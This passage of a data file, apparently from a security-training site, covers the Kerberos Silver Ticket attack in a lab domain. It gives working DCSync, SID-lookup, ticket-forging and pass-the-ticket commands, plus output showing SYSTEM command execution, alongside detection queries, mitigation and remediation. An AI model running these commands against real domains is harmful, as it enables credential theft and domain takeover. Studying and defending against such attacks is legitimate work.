      'Forge a TGS offline using ticketer.py / mimikatz — set the impersonated user to anyone (e.g. Administrator) and stuff the PAC with Domain Admins SIDs.',
      'Inject the ticket into the current session (KRB5CCNAME / kerberos::ptt).',
      'Access the target service directly — the service decrypts, validates, and grants admin access. The DC never sees the request.',
    ],
    walkthrough: [
      {
        title: 'Step 1 — Obtain the service account NT hash',
        description:
          'In the HTB lab path we already cracked the sqlsvc account via Kerberoasting. In the wild the hash typically comes from DCSync, LSASS dump, or a stolen keytab. Whatever the source — we need the NT hash (or AES256 key) of the account that owns the target SPN.',
        commands: [
          'secretsdump.py -just-dc-user sqlsvc INLANEFREIGHT.LOCAL/administrator@10.10.10.161',
        ],
        output: 'sqlsvc:1108:aad3b435b51404eeaad3b435b51404ee:b18b7a3d3e0b0a4e9c5d2f1a8c7b6d5e:::',
        image: { src: adSilverTicketFlow, caption: 'Silver Ticket: forged TGS goes straight to the service, bypassing the KDC entirely.' },
      },
      {
        title: 'Step 2 — Gather domain SID and target SPN',
        description:
          'The forged TGS PAC must contain a valid domain SID otherwise the service rejects the ticket. Get it from any domain-joined host or via Impacket.',
        commands: [
          'lookupsid.py INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!@10.10.10.161 0 | head',
          'whoami /user   # from any domain machine',
        ],
        output: 'Domain SID: S-1-5-21-3842939050-3880317879-2865463114\nSPN target: MSSQLSvc/sql01.inlanefreight.local:1433',
      },
      {
        title: 'Step 3 — Forge the Silver Ticket with ticketer.py',
        description:
          'ticketer.py builds a TGS offline, encrypts it with the supplied NT hash, and stuffs the PAC with whatever SIDs we like. We impersonate "Administrator" and inject the well-known Domain Admins (-512) and Enterprise Admins (-519) SIDs so the target service sees us as a god.',
        commands: [
          'ticketer.py -nthash b18b7a3d3e0b0a4e9c5d2f1a8c7b6d5e \\\n  -domain-sid S-1-5-21-3842939050-3880317879-2865463114 \\\n  -domain INLANEFREIGHT.LOCAL \\\n  -spn MSSQLSvc/sql01.inlanefreight.local:1433 \\\n  -user-id 500 -groups 512,513,518,519,520 \\\n  Administrator',
        ],
        output: '[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for INLANEFREIGHT.LOCAL/Administrator\n[*] Saving ticket in Administrator.ccache',
      },
      {
        title: 'Step 4 — Inject and use the ticket',
        description:
          'Export KRB5CCNAME to point at the ccache and Impacket\'s tools will use the forged TGS automatically. From a Windows host, mimikatz kerberos::ptt loads the .kirbi into the current logon session.',
        commands: [
          'export KRB5CCNAME=$PWD/Administrator.ccache',
          'mssqlclient.py -k -no-pass INLANEFREIGHT.LOCAL/Administrator@sql01.inlanefreight.local',
          '# Windows alternative\nmimikatz # kerberos::ptt Administrator.kirbi',
        ],
        output: 'SQL (INLANEFREIGHT\\Administrator  dbo@master)> EXEC xp_cmdshell \'whoami\';\nNT AUTHORITY\\SYSTEM',
      },
      {
        title: 'Step 5 — Persistence considerations',
        description:
          'Silver Tickets live until the service account password is rotated. Resetting krbtgt does NOT invalidate them. Attackers re-use the same hash months later — making this one of the stealthiest persistence techniques in AD.',
        commands: [
          '# Rotate the service-account password to kill all live silver tickets\nNet user sqlsvc <NewPassword> /domain',
        ],
      },
    ],
    commandsCheatsheet: [
      { title: 'Impacket — DCSync hash', command: 'secretsdump.py -just-dc-user <svc> DOMAIN/admin@<DC>' },
      { title: 'Impacket — domain SID', command: 'lookupsid.py DOMAIN/user:pass@<DC> 0' },
      { title: 'Impacket — forge TGS', command: 'ticketer.py -nthash <hash> -domain-sid <SID> -domain DOMAIN -spn <SPN> -user-id 500 -groups 512,513,518,519,520 Administrator' },
      { title: 'Use forged ticket', command: 'export KRB5CCNAME=Administrator.ccache && mssqlclient.py -k -no-pass DOMAIN/Administrator@host' },
      { title: 'Mimikatz — forge + inject', command: 'kerberos::golden /user:Administrator /domain:DOMAIN /sid:<SID> /target:<host> /service:cifs /rc4:<hash> /ptt' },
    ],
    commandExplanations: [
      {
        command: 'ticketer.py -nthash <hash> -domain-sid <SID> -domain DOMAIN -spn MSSQLSvc/sql01:1433 -user-id 500 -groups 512,513,518,519,520 Administrator',
        purpose: 'Forge a Kerberos TGS offline encrypted with the service account NT hash and stuff the PAC with admin SIDs.',
        breakdown: [
          { flag: '-nthash', meaning: 'NT hash of the service account that owns the SPN — used as the encryption key for the forged TGS.' },
          { flag: '-domain-sid', meaning: 'Domain SID prefix — the PAC SIDs (512 = Domain Admins) attach to this prefix.' },
          { flag: '-spn', meaning: 'Service Principal Name we want to access (cifs/, MSSQLSvc/, HTTP/, etc).' },
          { flag: '-user-id 500', meaning: 'RID 500 = built-in Administrator. The impersonated principal.' },
          { flag: '-groups 512,513,518,519,520', meaning: 'Domain Admins, Domain Users, Schema Admins, Enterprise Admins, Group Policy Creators — instant god-mode in the PAC.' },
          { flag: 'Administrator', meaning: 'Username string written into the ticket.' },
        ],
        why: 'Because the service decrypts the TGS with its own NT hash and trusts the PAC implicitly, every group SID we list is granted — no DC verification, no validation call (PAC validation is off by default).',
      },
      {
        command: 'export KRB5CCNAME=$PWD/Administrator.ccache && mssqlclient.py -k -no-pass DOMAIN/Administrator@sql01',
        purpose: 'Inject the forged ticket into the Linux Kerberos cache and authenticate to the target service.',
        breakdown: [
          { flag: 'KRB5CCNAME', meaning: 'Env var pointing to the credential cache MIT Kerberos / Impacket reads from.' },
          { flag: '-k', meaning: 'Use Kerberos (cached ticket) instead of NTLM.' },
          { flag: '-no-pass', meaning: 'Skip password prompt — we already have a ticket.' },
        ],
        why: 'No NTLM, no AS-REQ, no TGS-REQ — traffic looks like a normal authenticated SMB/MSSQL session to the target. The DC has zero visibility.',
      },
    ],
    toolsExplained: [
      { name: 'Impacket — secretsdump.py', category: 'Credential Access', purpose: 'DCSync the NT hash of any account.', why: 'Single command pulls the service account hash needed to forge the ticket.', link: 'https://github.com/fortra/impacket' },
      { name: 'Impacket — ticketer.py', category: 'Kerberos Forgery', purpose: 'Build Silver / Golden Tickets offline on Linux.', why: 'No mimikatz needed; produces a portable .ccache that any Impacket tool can use.', link: 'https://github.com/fortra/impacket' },
      { name: 'Mimikatz', category: 'Kerberos / Windows', purpose: 'Forge & inject Silver / Golden Tickets natively.', why: 'kerberos::golden + /ptt loads the forged TGS straight into the current logon session — no disk artefact.', link: 'https://github.com/gentilkiwi/mimikatz' },
      { name: 'Rubeus', category: 'Kerberos / Windows', purpose: 'Modern alternative to mimikatz for ticket abuse.', why: 'C# (in-memory friendly), supports AES keys, and integrates with C2.', link: 'https://github.com/GhostPack/Rubeus' },
      { name: 'lookupsid.py', category: 'Recon', purpose: 'Enumerate domain SID + user RIDs anonymously or with creds.', why: 'Required for the -domain-sid flag in ticketer.py.', link: 'https://github.com/fortra/impacket' },
    ],
    enumerationDetection: [
      {
        title: 'Hash theft precursor — DCSync (4662)',
        description: 'A Silver Ticket needs a service-account hash. Spotting DCSync (Replicating Directory Changes rights used by a non-DC account) is the earliest detection point.',
        eventIds: ['4662'],
        dataSource: 'Domain Controller — Security log',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'SecurityEvent\n| where EventID == 4662\n| where Properties has "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  // DS-Replication-Get-Changes\n   or  Properties has "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  // DS-Replication-Get-Changes-All\n| where AccountName !endswith "$"',
      },
      {
        title: 'LSASS access — hash dumping',
        description: 'Hash theft from LSASS is the second most common precursor. Sysmon Event 10 with target=lsass.exe and unusual GrantedAccess masks is the giveaway.',
        eventIds: ['10'],
        dataSource: 'Sysmon',
        queryLanguage: 'KQL',
        severity: 'High',
        query: 'Event\n| where Source == "Microsoft-Windows-Sysmon" and EventID == 10\n| where TargetImage endswith "lsass.exe"\n| where GrantedAccess in ("0x1010","0x1410","0x1438","0x143a","0x1fffff")',
      },
    ],
    socDetection: [
      {
        title: 'TGS use without preceding TGS-REQ',
        description: 'A real TGS use generates Event 4769 on the DC immediately before the service is hit. A Silver Ticket skips this — so a service authentication (4624 logon type 3 with Kerberos) on the member server with NO matching 4769 within ±2 minutes on the DC is a very strong indicator.',
        eventIds: ['4624', '4769'],
        dataSource: 'DC Security log + Member server Security log (correlation)',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'let kerbLogons = SecurityEvent\n| where EventID == 4624 and LogonType == 3 and AuthenticationPackageName == "Kerberos"\n| project lt=TimeGenerated, TargetUserName, IpAddress, Computer;\nlet tgsReqs = SecurityEvent\n| where EventID == 4769\n| project rt=TimeGenerated, TargetUserName, IpAddress;\nkerbLogons\n| join kind=leftanti tgsReqs on TargetUserName, IpAddress\n   and $left.lt between ((rt - 2m) .. (rt + 2m))\n| where TargetUserName !endswith "$" and TargetUserName != "ANONYMOUS LOGON"',
      },
      {
        title: 'PAC anomalies — non-standard logon attributes',
        description: 'Forged PACs often have inconsistencies: logon time = 0, ticket lifetime = 10 years, or impossible group memberships. Defender for Identity flags these as "Suspected Golden / Silver Ticket usage".',
        eventIds: ['4624', '4769'],
        dataSource: 'Microsoft Defender for Identity',
        queryLanguage: 'KQL',
        severity: 'Critical',
        query: 'IdentityLogonEvents\n| where ActionType == "LogonSuccess" and Protocol == "Kerberos"\n| where AdditionalFields has "encryption_type:0x17" or AdditionalFields has "ticket_lifetime > 10h"',
      },
      {
        title: 'Service-account interactive use',
        description: 'Service accounts shouldn\'t produce interactive (LogonType 2/10) logons — only network (3) and service (5). A 4624 LogonType 2 for a service account is a textbook impersonation indicator.',
        eventIds: ['4624'],
        dataSource: 'Member servers — Security log',
        queryLanguage: 'SPL',
        severity: 'High',
        query: 'index=wineventlog EventCode=4624 (Logon_Type=2 OR Logon_Type=10) Account_Name="svc-*"\n| stats count by Account_Name, Workstation_Name, Logon_Type',
      },
    ],
    detection: [
      'Correlate 4624 (Kerberos logon on member server) with 4769 (TGS-REQ on DC). Missing 4769 = forged ticket.',
      'Microsoft Defender for Identity native detection: "Suspected Silver Ticket usage".',
      'Alert on RC4 (0x17) Kerberos tickets on services that should negotiate AES (0x12).',
      'Hunt for DCSync (4662 with Replicating Directory Changes) and LSASS access (Sysmon 10) — Silver Ticket prerequisites.',
      'Service accounts performing interactive logons (4624 LogonType 2/10).',
    ],
    mitigation: [
      'Migrate every service account to Group Managed Service Accounts (gMSA) — passwords auto-rotate every 30 days, killing any existing Silver Ticket on rotation.',
      'Force AES-only on the forest (msDS-SupportedEncryptionTypes = 0x18) so RC4 tickets stand out.',
      'Enable PAC validation on critical services (KrbtgtFullPacSignature) — the service then verifies the PAC with the KDC, catching forged group SIDs.',
      'Tier the AD model: never let service accounts accumulate Domain Admin or local admin on Tier-0 hosts.',
      'Rotate service-account passwords every 90 days at minimum; immediately on any incident touching that account.',
    ],
    remediation: [
      'Identify the compromised service account; reset its password TWICE (immediately + after 24h) to invalidate every Silver Ticket and clear cached keys.',
      'Audit the target service (MSSQL, CIFS, etc) for any actions during the suspected window — the attacker had impersonation rights.',
      'Review all Tier-0 group memberships (Domain Admins, Enterprise Admins) — Silver Tickets are often a stepping stone to Golden.',
      'Pull all 4624 / 4769 logs from the affected member server for 90 days and hunt for prior Silver Ticket use.',
      'Migrate the affected SPN to a gMSA so future password rotation is automatic.',
      'If Domain Admin compromise is suspected, also reset krbtgt twice (10-hour gap) to kill any Golden Tickets.',
    ],
    mitre: [
      { id: 'T1558.002', name: 'Silver Ticket', url: 'https://attack.mitre.org/techniques/T1558/002/' },
      { id: 'T1550.003', name: 'Pass the Ticket', url: 'https://attack.mitre.org/techniques/T1550/003/' },
      { id: 'T1003.006', name: 'OS Credential Dumping — DCSync', url: 'https://attack.mitre.org/techniques/T1003/006/' },
    ],
    tools: ['Impacket (ticketer.py, secretsdump.py, lookupsid.py)', 'Mimikatz', 'Rubeus', 'PowerView', 'BloodHound'],
    references: [
      { title: 'HTB Academy — Kerberos Attacks', url: 'https://academy.hackthebox.com/module/details/143' },
      { title: 'MITRE ATT&CK T1558.002', url: 'https://attack.mitre.org/techniques/T1558/002/' },
      { title: 'Microsoft — Group Managed Service Accounts', url: 'https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview' },
      { title: 'SpecterOps — A Case Study in Wagging the Dog (Silver/Golden)', url: 'https://posts.specterops.io/' },
    ],
  },
];
